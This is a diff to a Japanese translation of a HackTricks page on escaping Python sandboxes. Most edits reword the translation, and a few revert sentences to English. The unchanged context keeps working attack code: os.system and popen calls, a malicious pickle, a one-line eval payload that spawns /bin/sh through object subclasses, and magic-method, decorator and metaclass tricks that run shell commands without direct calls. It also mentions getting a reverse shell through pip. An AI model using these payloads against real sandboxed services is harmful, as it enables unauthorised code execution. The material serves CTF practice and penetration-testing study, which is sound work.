@@ -9,25 +9,17 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
 
 </details>
 {% endhint %}
-
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
 
 これらは、Pythonサンドボックスの保護をバイパスし、任意のコマンドを実行するためのいくつかのトリックです。
 
 ## コマンド実行ライブラリ
 
-最初に知っておくべきことは、すでにインポートされているライブラリを使用して直接コードを実行できるか、またはこれらのライブラリのいずれかをインポートできるかどうかです：
+最初に知っておくべきことは、すでにインポートされているライブラリでコードを直接実行できるか、またはこれらのライブラリのいずれかをインポートできるかどうかです：
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -60,23 +52,23 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-覚えておいてください、_**open**_ と _**read**_ 関数は、python サンドボックス内の **ファイルを読み取る** のに役立ち、**バイパス**するために **実行**できる **コードを書く** のに役立ちます。
+Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
 
 {% hint style="danger" %}
-**Python2 input()** 関数は、プログラムがクラッシュする前に python コードを実行することを許可します。
+**Python2 input()** 関数は、プログラムがクラッシュする前にPythonコードを実行することを可能にします。
 {% endhint %}
 
-Python は **最初に現在のディレクトリからライブラリを読み込もうとします**（次のコマンドは、python がモジュールをどこから読み込んでいるかを表示します）： `python3 -c 'import sys; print(sys.path)'`
+Pythonは最初に**現在のディレクトリからライブラリをロードしようとします**（次のコマンドはPythonがモジュールをどこからロードしているかを表示します）： `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
-## デフォルトでインストールされた python パッケージを使用して pickle サンドボックスをバイパスする
+## デフォルトでインストールされたPythonパッケージを使用してpickleサンドボックスをバイパスする
 
 ### デフォルトパッケージ
 
-ここに **事前インストールされた** パッケージのリストがあります: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-pickle から、python 環境がシステムにインストールされた **任意のライブラリをインポート** できることに注意してください。\
-例えば、次の pickle は、読み込まれると pip ライブラリをインポートします：
+ここに**プリインストールされた**パッケージのリストがあります: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+pickleから、Python環境がシステムにインストールされた**任意のライブラリをインポートする**ことができることに注意してください。\
+例えば、次のpickleは、ロードされるとpipライブラリをインポートします：
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -93,7 +85,7 @@ print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 
 ### Pipパッケージ
 
-**@isHaacK**によって共有されたトリック
+**@isHaacK**によるトリック
 
 `pip`または`pip.main()`にアクセスできる場合、任意のパッケージをインストールし、次のように呼び出すことでリバースシェルを取得できます:
 ```bash
@@ -158,7 +150,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## エンコーディングを通じた保護の回避 (UTF-7)
+## Bypassing protections through encodings (UTF-7)
 
 [**このレポート**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) では、UFT-7を使用して、見かけ上のサンドボックス内で任意のPythonコードをロードして実行します：
 ```python
@@ -175,7 +167,7 @@ return x
 
 ## コールなしのPython実行
 
-コールを行うことが**許可されていない**Pythonジャイル内にいる場合でも、**任意の関数、コード**、および**コマンド**を**実行する**方法はいくつかあります。
+コールを行うことが**許可されていない**Pythonの監獄内にいる場合でも、**任意の関数、コード**、および**コマンド**を**実行する**方法はいくつかあります。
 
 ### [デコレーター](https://docs.python.org/3/glossary.html#term-decorator)を使用したRCE
 ```python
@@ -205,7 +197,7 @@ class _:pass
 
 #### カスタムクラスによるRCE
 
-いくつかの**クラスメソッド**（_既存のクラスメソッドを上書きするか、新しいクラスを作成することによって_）を修正して、**直接呼び出すことなく**トリガーされたときに**任意のコード**を**実行**させることができます。
+いくつかの**クラスメソッド**（既存のクラスメソッドを上書きするか、新しいクラスを作成することによって）を修正して、**直接呼び出すことなく**トリガーされたときに**任意のコード**を**実行**させることができます。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -257,7 +249,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### [メタクラス](https://docs.python.org/3/reference/datamodel.html#metaclasses)を使ったオブジェクトの作成
 
-メタクラスが私たちに許可する重要なことは、**コンストラクタを直接呼び出すことなくクラスのインスタンスを作成する**ことであり、ターゲットクラスをメタクラスとして新しいクラスを作成することです。
+メタクラスが私たちに許可する重要なことは、**コンストラクタを直接呼び出すことなく、クラスのインスタンスを作成する**ことです。これは、ターゲットクラスをメタクラスとして新しいクラスを作成することによって実現されます。
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -274,7 +266,7 @@ Sub['import os; os.system("sh")']
 ```
 #### 例外を伴うオブジェクトの作成
 
-**例外がトリガーされる**と、**Exception**のオブジェクトが**作成され**、コンストラクタを直接呼び出す必要はありません（[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)からのトリック）：
+**例外がトリガーされる**と、**Exception**のオブジェクトが**作成され**、コンストラクタを直接呼び出す必要はありません（[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)のトリック）：
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -340,7 +332,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 `__builtins__`がない場合、**すべてのグローバル関数**（`open`、`import`、`print`など）が**ロードされていない**ため、何もインポートしたり、ファイルを読み書きしたりすることはできません。\
 しかし、**デフォルトではPythonは多くのモジュールをメモリにインポートします**。これらのモジュールは無害に見えるかもしれませんが、その中には**危険な**機能を**インポートしている**ものもあり、それにアクセスすることで**任意のコード実行**を得ることができます。
 
-以下の例では、**無害な**モジュールのいくつかを**悪用**して、内部の**危険な**機能に**アクセス**する方法を観察できます。
+以下の例では、**無害な**モジュールのいくつかを**悪用**して、**危険な****機能**に**アクセス**する方法を観察できます。
 
 **Python2**
 ```python
@@ -424,11 +416,11 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**以下により大きな関数があります**](./#recursive-search-of-builtins-globals) で、**グローバル変数**を見つけるための**場所**を数十/**数百**見つけることができます。
+[**以下により大きな関数があります**](./#recursive-search-of-builtins-globals) で、**グローバル**を見つけることができる**場所**を数十/**数百**見つけることができます。
 
 ## 任意の実行を発見する
 
-ここでは、**より危険な機能**を簡単に発見し、より信頼性の高いエクスプロイトを提案する方法を説明します。
+ここでは、**より危険な機能を簡単に発見**し、より信頼性の高いエクスプロイトを提案する方法を説明します。
 
 #### バイパスを使用したサブクラスへのアクセス
 
@@ -561,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## ビルトイン、グローバルの再帰的検索...
 
 {% hint style="warning" %}
-これはただの**素晴らしい**ものです。もしあなたが**グローバル、ビルトイン、オープンなどのようなオブジェクトを探しているなら**、このスクリプトを使って**そのオブジェクトを見つけることができる場所を再帰的に見つけてください。**
+これはただの**素晴らしい**ものです。もし**globals、builtins、open、またはその他のオブジェクトを探しているなら**、このスクリプトを使って**そのオブジェクトを見つけることができる場所を再帰的に見つけてください。**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -711,11 +703,11 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-注意してほしいのは、通常の方法で**属性**に**ドット**を使ってアクセスできることです。例えば、`people_obj.__init__`や、**辞書要素**に**括弧**を使って引用符なしでアクセスできることです。例：`__globals__[CONFIG]`
+注意してほしいのは、通常の方法で**属性**に**ドット**を使ってアクセスできることです。例えば `people_obj.__init__` と、**辞書要素**には**括弧**を使って引用符なしでアクセスできることです。例: `__globals__[CONFIG]`
 
-また、`.__dict__`を使用してオブジェクトの要素を列挙できることにも注意してください。例：`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+また、`.__dict__`を使用してオブジェクトの要素を列挙できることにも注意してください。例: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-フォーマット文字列の他の興味深い特徴は、**`str`**、**`repr`**、**`ascii`**の**関数**を指定されたオブジェクトで実行する可能性です。これにはそれぞれ**`!s`**、**`!r`**、**`!a`**を追加します：
+フォーマット文字列の他の興味深い特徴は、**`str`**、**`repr`**、**`ascii`**の**関数**を指定されたオブジェクトで実行する可能性です。これにはそれぞれ**`!s`**、**`!r`**、**`!a`**を追加します:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -734,7 +726,7 @@ return 'HAL 9000'
 **フォーマット** **文字列**の**例**についての**さらなる例**は[**https://pyformat.info/**](https://pyformat.info)で見つけることができます。
 
 {% hint style="danger" %}
-以下のページも確認して、Python内部オブジェクトから**機密情報を読み取る**ガジェットを探してください：
+次のページも確認して、Python内部オブジェクトから**機密情報を読み取る**ガジェットを探してください：
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -755,12 +747,12 @@ return 'HAL 9000'
 ## Pythonオブジェクトの解剖
 
 {% hint style="info" %}
-もし**pythonバイトコード**について深く**学びたい**なら、このトピックに関する**素晴らしい**投稿を読んでください: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+**Pythonバイトコード**について深く**学びたい**場合は、このトピックに関する**素晴らしい**投稿を読んでください: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
 いくつかのCTFでは、**フラグ**が存在する**カスタム関数の名前**が提供され、その**関数**の**内部**を確認して抽出する必要があります。
 
-これが調査する関数です:
+これが検査する関数です:
 ```python
 def get_flag(some_input):
 var1=1
@@ -771,7 +763,7 @@ return "THIS-IS-THE-FALG!"
 else:
 return "Nope"
 ```
-#### ディレクトリ
+#### dir
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -793,7 +785,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **関数コードへのアクセス**
 
-**`__code__`** と `func_code`: この **属性** に **アクセス** して、関数の **コードオブジェクト** を **取得** できます。
+**`__code__`** と **func_code**: この **属性** に **アクセス** することで、関数の **コードオブジェクト** を **取得** できます。
 ```python
 # In our current example
 get_flag.__code__
@@ -952,7 +944,7 @@ types.CodeType.__doc__
 ### 漏洩した関数の再作成
 
 {% hint style="warning" %}
-次の例では、関数コードオブジェクトから関数を再作成するために必要なすべてのデータを直接取得します。**実際の例**では、関数を実行するために必要なすべての**値**が**漏洩させる必要があるもの**です。
+次の例では、関数コードオブジェクトから関数を再作成するために必要なすべてのデータを取得します。**実際の例**では、関数を実行するためのすべての**値**、すなわち**`code_type`**を**漏洩させる**必要があります。
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1006,7 +998,7 @@ f(42)
 ```
 ## コンパイルされたPythonの逆コンパイル
 
-[**https://www.decompiler.com/**](https://www.decompiler.com)のようなツールを使用すると、与えられたコンパイル済みのPythonコードを**逆コンパイル**できます。
+[**https://www.decompiler.com/**](https://www.decompiler.com) のようなツールを使用すると、与えられたコンパイル済みのPythonコードを**逆コンパイル**できます。
 
 **このチュートリアルをチェックしてください**:
 
@@ -1018,7 +1010,7 @@ f(42)
 
 ### アサート
 
-`-O`パラメータで最適化されたPythonは、アサートステートメントと**debug**の値に基づく任意のコードを削除します。\
+`-O` パラメータで最適化されたPythonは、アサートステートメントと**debug**の値に基づく任意のコードを削除します。\
 したがって、次のようなチェックが
 ```python
 def check_permission(super_user):
@@ -1039,23 +1031,18 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
 
 </details>
 {% endhint %}
